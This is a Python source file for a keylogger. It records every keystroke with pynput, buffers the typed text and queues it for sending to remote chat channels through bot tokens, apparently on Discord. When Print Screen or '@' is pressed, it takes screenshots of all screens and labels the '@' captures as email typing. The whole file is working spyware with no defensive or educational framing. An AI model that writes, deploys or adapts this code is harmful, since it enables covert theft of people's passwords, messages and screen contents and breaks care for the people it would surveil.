from pynput.keyboard import Key, Listener
from resources.misc import *
from PIL import ImageGrab
# end of imports

keycodes = {k: f' *`{k.name.upper()}`*' for k in Key}

def on_press(key):
    global text_buffor
    processed_key = str(key)[1:-1] if isinstance(key, Key) else key.char if hasattr(key, 'char') else str(key)

    processed_key = keycodes.get(key, processed_key)
    if isinstance(key, Key):
        if key == Key.enter:
            messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
        elif key in {Key.print_screen, '@'}:
            ImageGrab.grab(all_screens=True).save('ss.png')
            embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if key == Key.print_screen else ' `[Email typing]`'), 'ss.png'])
            processed_key = ' *`Print Screen`*' if key == Key.print_screen else '@'
    text_buffor += str(processed_key)
    if len(text_buffor) > 1975:
        messages_to_send.append([channel_ids['spam'] if any(x in text_buffor for x in ('wwwww', 'aaaaa', 'sssss', 'ddddd')) else channel_ids['main'], text_buffor])
        text_buffor = ''

with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        try:
            client.run(token)
        except: pass
    listener.join()
